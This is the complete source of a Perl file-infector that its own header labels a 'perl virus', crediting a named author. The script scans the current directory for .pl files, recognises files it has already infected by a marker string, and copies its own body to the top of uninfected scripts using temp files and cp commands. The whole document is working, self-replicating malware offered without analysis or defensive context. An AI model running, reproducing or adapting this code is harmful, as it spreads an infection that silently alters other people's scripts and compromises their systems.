#!/usr/bin/perl
#onehalf3554

#                this perl virus (c)Chernickevich Konstantin
#                http://onehalf.hotmail.ru
#                email:onehalf3554@mail.ru



system"clear";
$partone="#End_my";
$parttwo="_body";
$EndMarker=$partone.$parttwo;
$infected=0;
$BodyCopy=0;
$textold="";

# this "while" for detecting *.pl file
# and output in the $_ local perl variable

while (<*.pl>)
{

$files=$_;
$text="<".$_;
$textw=">".$_;
$textww=">>".$_;


 open(TESTFILE,$text);
 until(eof(TESTFILE))
        {
          $strres=readline(TESTFILE);
	  
    
#               this procedure detecting a marker in the *.pl file
#      if marker detected then file infected if not then file not infected!

          if ($strres=~ m/onehalf3554/i)
	   {
                  if ($BodyCopy==0)
	                 { 
	                    $BodyCopy=1;
	                    open(VIRUSBODY,$text);
	                      until ($BodyStr=~ m/$EndMarker/i)
	                        {
	                         $BodyStr=readline(VIRUSBODY) ;
	                         $BodyLoopCount++;
	                         $BodyArray[$BodyLoopCount]=$BodyStr; 
	                        }
                            close(VIRUSBODY);
	                  } 
			  $infected=1;
	   }
         }
close (TESTFILE);

if ($infected==1)
{
print "[im detecting old infecting file :]\n";
print $textw." infected old time.[Ok]\n";
open(RESERVBODY,">body.bod");
print RESERVBODY @BodyArray;
close(RESERVBODY);
}


        if ($infected==0)
	{    
	               print $textw."im trying infecting this file now! \n";
                       system "cp ".$files." temp.bod";
		       open(NULFILE,$textww);
		       $NUL="";
		       print NULFILE $NUL;
		       system "cp body.bod"." ".$files; 
                       open(DATAFILE,"<temp.bod");
		       until(eof(DATAFILE))
		       {
		       $reloader=readline(DATAFILE);    	
		       print NULFILE $reloader;                
		       }
	  close(DATAFILE);	       
          close(NULFILE);
	}

 }
#End_my_body

